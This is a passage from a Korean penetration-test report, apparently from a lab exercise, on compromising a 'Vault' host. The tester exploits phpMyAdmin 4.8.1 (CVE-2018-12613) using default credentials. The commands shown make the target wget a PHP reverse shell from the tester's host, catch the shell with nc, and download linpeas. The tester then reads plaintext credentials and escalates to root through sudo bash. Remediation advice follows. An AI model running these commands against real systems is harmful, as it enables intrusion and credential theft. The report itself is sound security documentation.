+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>172.31.147.149 - - <span style="color:#89dceb;font-weight:bold">[</span>10/Nov/2024 00:09:21<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#a6e3a1">&#34;GET /revshell.php HTTP/1.1&#34;</span> <span style="color:#fab387">200</span> -
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>172.31.147.149 - - <span style="color:#89dceb;font-weight:bold">[</span>10/Nov/2024 00:09:22<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#a6e3a1">&#34;GET /revshell.php HTTP/1.1&#34;</span> <span style="color:#fab387">200</span> -
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>└─$ python2 50457.py 172.31.147.149 <span style="color:#fab387">80</span> /phpmyadmin root password <span style="color:#a6e3a1">&#34;ls -la /tmp/revshell.php&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>-rw-r--r-- <span style="color:#fab387">1</span> www-data www-data <span style="color:#fab387">2583</span> Nov  <span style="color:#fab387">9</span> 17:40 /tmp/revshell.php
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>└─$ python2 50457.py 172.31.147.149 <span style="color:#fab387">80</span> /phpmyadmin root password <span style="color:#a6e3a1">&#34;chmod +x/tmp/revshell.php&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>└─$ python2 50457.py 172.31.147.149 <span style="color:#fab387">80</span> /phpmyadmin root password <span style="color:#a6e3a1">&#34;ls -la /tmp/revshell.php&#34;</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>-rwxr-xr-x <span style="color:#fab387">1</span> www-data www-data <span style="color:#fab387">2583</span> Nov  <span style="color:#fab387">9</span> 17:40 /tmp/revshell.php
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>└─$ python2 50457.py 172.31.147.149 <span style="color:#fab387">80</span> /phpmyadmin root password <span style="color:#a6e3a1">&#34;php /tmp/revshell.php&#34;</span></span></span></code></pre></div>
+<p>유저 권한 획득</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvnp <span style="color:#fab387">1234</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.8.0.97<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>172.31.147.149<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">59278</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux ip-172-31-147-149 5.4.0-1085-aws <span style="color:#6c7086;font-style:italic">#92~18.04.1-Ubuntu SMP Wed Aug 31 17:21:08 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 05:15:45 up <span style="color:#fab387">26</span> min,  <span style="color:#fab387">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>www-data</span></span></code></pre></div>
+<hr>
+<h4 id="23-권한-상승">2.3 권한 상승</h4>
+<p>Vault 호스트에 유저 권한을 획득하고 root 유저로의 권한 상승을 위해 <code>linpeas.sh</code> 스크립트를 통한 자동 정보 수집을 진행했습니다. 이를 통해 <code>bobbyz</code> 유저가 해당 호스트에 존재하는 것을 발견하였고, <code>.bobbyz_creds.txt</code>라는 파일을 또한 발견하였습니다. 해당 파일 제목에서 유저의 계정 정보가 포함되어 있을 것이라는 유추를 해볼 수 있었습니다. 해당 파일에는 평문으로 저장되어 있는 유저 이름과 비밀번호가 포함되어 있었으며 bobbyz 유저의 계정 정보를 획득하여 해당 유저로 로그인 해 <code>sudo -l</code> 명령어를 활용하여 <code>sudo</code> 권한으로 <code>root</code>유저로의 침투까지 성공적으로 완료하였습니다.</p>
+<p>초기 침투와 마찬가지로 <code>wget</code>명령어를 통해 linpeas.sh 스크립트를 가져온 후 실행 권한을 부여한 뒤에 진행하였습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>&lt;/$ wget http://10.8.0.97:8888/linpeas.sh -O /tmp/linpeas.sh                
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>--2024-11-10 05:24:05--  http://10.8.0.97:8888/linpeas.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Connecting to 10.8.0.97:8888... connected.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>HTTP request sent, awaiting response... <span style="color:#fab387">200</span> OK
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Length: <span style="color:#fab387">827739</span> <span style="color:#89dceb;font-weight:bold">(</span>808K<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>text/x-sh<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Saving to: <span style="color:#a6e3a1">&#39;/tmp/linpeas.sh&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>/tmp/linpeas.sh     100%<span style="color:#89dceb;font-weight:bold">[===================</span>&gt;<span style="color:#89dceb;font-weight:bold">]</span> 808.34K   348KB/s    in 2.3s    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>2024-11-10 05:24:07 <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">348</span> KB/s<span style="color:#89dceb;font-weight:bold">)</span> - <span style="color:#a6e3a1">&#39;/tmp/linpeas.sh&#39;</span> saved <span style="color:#89dceb;font-weight:bold">[</span>827739/827739<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>www-data@ip-172-31-147-149:/$ ls -la /tmp/linpeas.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>-rwxrwxrwx <span style="color:#fab387">1</span> www-data www-data <span style="color:#fab387">827739</span> Nov  <span style="color:#fab387">6</span> 03:34 /tmp/linpeas.sh</span></span></code></pre></div>
+<p>linpeas.sh 스크립트를 통하여 <code>bobbyz</code> 유저와 <code>.bobbyz_creds.txt</code> 파일이 존재한다는 사실을 확보하였습니다.</p>
+<p><img src="Pasted%20image%2020241109123313.png#center" alt="alt text"></p>
+<p><img src="Pasted%20image%2020241109123902.png#center" alt="alt text"></p>
+<p><img src="Pasted%20image%2020241109233004.png#center" alt="alt text"></p>
+<p><code>.bobbyz_creds.txt</code> 파일 안에 평문으로 계정 정보가 저장되어 있는 모습을 볼 수 있습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>www-data@ip-172-31-147-149:/$ cat /.bobbyz_creds.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Vault server breakglass creds - bobbyz:qwerty12</span></span></code></pre></div>
+<p>발견한 계정 정보를 이용하여 <code>bobbyz</code> 유저로 로그인 하였습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>www-data@ip-172-31-147-149:/$ su bobbyz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>bobbyz@ip-172-31-147-149:/$ whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>bobbyz</span></span></code></pre></div>
+<p><code>sudo -l</code> 명령어를 통해 <code>/bin/bash</code>명령어를 sudo 권한으로 사용할 수 있다는 사실을 확보한 뒤 root 유저로의 권한 상승을 성공적으로 진행했습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>bobbyz@ip-172-31-147-149:/$ sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Matching Defaults entries <span style="color:#cba6f7">for</span> bobbyz on ip-172-31-147-149:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>    <span style="color:#f5e0dc">secure_path</span><span style="color:#89dceb;font-weight:bold">=</span>/usr/local/sbin<span style="color:#89b4fa">\:</span>/usr/local/bin<span style="color:#89b4fa">\:</span>/usr/sbin<span style="color:#89b4fa">\:</span>/usr/bin<span style="color:#89b4fa">\:</span>/sbin<span style="color:#89b4fa">\:</span>/bin<span style="color:#89b4fa">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>User bobbyz may run the following commands on ip-172-31-147-149:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    <span style="color:#89dceb;font-weight:bold">(</span>ALL<span style="color:#89dceb;font-weight:bold">)</span> NOPASSWD: /bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>bobbyz@ip-172-31-147-149:/$ sudo /bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>root@ip-172-31-147-149:/# whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>root</span></span></code></pre></div>
+<hr>
+<h3 id="3-취약점-및-대응-방안">3. 취약점 및 대응 방안</h3>
+<h4 id="phpmyadmin-서비스-기본-계정-정보-사용">phpMyAdmin 서비스 기본 계정 정보 사용</h4>
+<p>디렉토리 버스팅을 통해 <code>http://172.31.147.149/phpmyadmin</code> 경로의 디렉토리 존재를 확인하였고 phpMyAdmin 서비스의 로그인 계정이 기본 설정인 <code>root:password</code>로 설정되어 있는 것을 발견하였습니다. 기본 계정을 유지하면 공격자가 쉽게 접근할 수 있는 경로를 제공합니다. 특히나 phpMyAdmin과 같은 민감한 데이터 베이스 관리 도구는 기본 계정으로 방치될 경우 심각한 데이터 유출 위험의 가능성이 있습니다.</p>
+<p><strong>개념 증명</strong>
+<code>root:password</code>기본 계정으로 /phpmyadmin에 성공적으로 로그인한 화면 입니다.</p>
+<p><img src="Pasted%20image%2020241109141747.png#center" alt="alt text"></p>
+<p><strong>대응 방안</strong>
+초기 설정된 계정을 반드시 변경하고 복잡한 비밀번호를 설정하여 데이터 유출의 가능성을 차단해야 합니다.</p>
+<h4 id="rce-공격에-취약한-버전-사용---phpmyadmin-481">RCE 공격에 취약한 버전 사용 - phpMyAdmin 4.8.1</h4>
+<p>해당 phpMyAdmin 페이지는 잘 알려진 취약점인 CVE-2018-12613이 존재하는 4.8.1 버전을 사용하고 있습니다. 이 취약점을 활용하면 Remote Code Execution 공격을 사용해 시스템 내부로의 침투가 가능합니다.</p>
+<p>해당 exploit은 RCE 취약점을 다음과 같은 절차를 통해 공격하는 것으로 보여집니다:</p>
+<ol>
+<li>버전 확인 - phpMyAdmin 페이지에 접속하여 대상 서버가 취약한 버전인지 확인합니다. phpMyAdmin 4.8.0과 4.8.1 버전에서만 작동합니다.</li>
+<li>토큰 및 세션 확보 - 로그인 페이지에서의 HTML에서 세션 쿠키를 확보합니다.</li>
+<li>로그인 요청 - parameter로 주어지는 사용자명과 비밀번호로 로그인하고, 로그인에 성공하면 새로운 토큰과 세션 쿠키를 받아옵니다.</li>
+<li>악성 쿼리 전송 - SQL 쿼리를 통해 php코드를 주입하여 원격 명령을 실행하는 쿼리를 전송합니다.</li>
+<li>세션 파일 접근 - 쿼리를 통해 서버의 세션 파일에 원하는 명령을 실행한 결과를 출력합니다.</li>
+</ol>
+<p><strong>개념 증명</strong>
+IP 주소, 포트, 경로, 계정 이름, 계정 비밀번호, 그리고 실행할 명령어를 입력하여 응답을 받아낸 화면 입니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ python2 50457.py 172.31.147.149 <span style="color:#fab387">80</span> /phpmyadmin root password whoami                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>www-data</span></span></code></pre></div>
+<p>초기 침투시에는 다음과 같은 명령어를 사용했고, 해당 명령어에 사용된 리버스 쉘 코드는 Pentest Monkey의 php reverse shell로 본 수행자의 IP 주소와 임의의 포트 넘버 1234를 입력하여 사용했습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ python2 50457.py 172.31.147.149 <span style="color:#fab387">80</span> /phpmyadmin root password <span style="color:#a6e3a1">&#34;wget http://10.8.0.97:8888/revshell.php -O /tmp/revshell.php&#34;</span></span></span></code></pre></div>
+<p><img src="Pasted%20image%2020241109113956.png#center" alt="alt text"></p>
+<p><strong>대응 방안</strong>
+해당 알려진 취약점은 phpMyAdmin 4.8.0, 4.8.1 버전에서만 공격 가능하므로 최신 버전으로의 업데이트를 권고 드립니다.</p>
+<h4 id="평문화로-저장된-계정-정보">평문화로 저장된 계정 정보</h4>
+<p>호스트 시스템내에 존재하는 <code>.bobbyz_cred.txt</code>파일에 계정 이름과 비밀번호가 평문으로 저장되어 있는 것을 발견하였습니다. 계정 정보와 같은 민감한 정보가 포함된 파일이 시스템내에 평문으로 존재할 경우 악의적인 사용자가 이를 열람하여 추가 권한 획득 및 시스템 침해에 악용할 수 있습니다.</p>
+<p><strong>개념 증명</strong></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>www-data@ip-172-31-147-149:/$ cat /.bobbyz_creds.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Vault server breakglass creds - bobbyz:qwerty12</span></span></code></pre></div>
+<p><strong>대응 방안</strong>
+계정 정보와 같은 민감한 정보는 시스템 내에 파일로 저장하지 않는 것을 추천 드립니다. 저장이 꼭 필요할 경우 평문으로 저장하지 않고 암호화를 거쳐서 일시적으로 저장하고 가급적으로 빠른 시일 내에 삭제하는 것을 권고 드립니다.</p>
+<hr>
+<h3 id="4-증거-스크린샷">4. 증거 스크린샷</h3>
+<p>초기 침투, 낮은 권한 www-data
+<img src="Pasted%20image%2020241109232748.png#center" alt="alt text"></p>
+<p>낮은 유저 권한 bobbyz
+<img src="Pasted%20image%2020241109233301.png#center" alt="alt text"></p>
+<p>root 권한
+<img src="Pasted%20image%2020241109233402.png#center" alt="alt text"></p>
+<hr>
+<h3 id="5-아티팩트-및-레퍼런스">5. 아티팩트 및 레퍼런스</h3>
+<h4 id="51-아티팩트">5.1 아티팩트</h4>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">파일 생성일</th>
+          <th style="text-align: center">파일 경로</th>
+          <th style="text-align: center">파일 이름</th>
+          <th style="text-align: center">파일 삭제일</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">2024/11/10 00:09 AM EST</td>
+          <td style="text-align: center">http[:]//172.31.147.149/tmp</td>
+          <td style="text-align: center">revshell.php</td>
+          <td style="text-align: center">2024/11/10 00:38 AM EST</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">2024/11/10 00:25 AM EST</td>
+          <td style="text-align: center">http[:]//172.31.147.149/tmp</td>
+          <td style="text-align: center">linpeas.sh</td>
+          <td style="text-align: center">2024/11/10 00:38 AM EST</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">2024/11/10 00:25 AM EST</td>
+          <td style="text-align: center">http[:]//172.31.147.149/tmp</td>
+          <td style="text-align: center">linpeas_output</td>
+          <td style="text-align: center">2024/11/09 00:38 AM EST</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h4 id="52-레퍼런스">5.2 레퍼런스</h4>
+<p><strong>phpMyAdmin 4.8.1 - Remote Code Execution Exploit</strong></p>
+<ul>
+<li>https[:]//www[.]exploit-db[.]com/exploits/50457</li>
+</ul>
+<hr>
+
+  </content>
+  
+  <p>
+    
+    <a href="/blog/bhpt/">#BHPT</a>&nbsp;&nbsp;
+    
+  </p>
+
+    </main>
+    <footer>
+      
+
+  <span>
+    
+    Made with
+    <a href="https://github.com/maolonglong/hugo-simple/">Hugo ʕ•ᴥ•ʔ Simple</a>
+  </span>
+
+
+    </footer>
+
+    
+</body>
+</html>
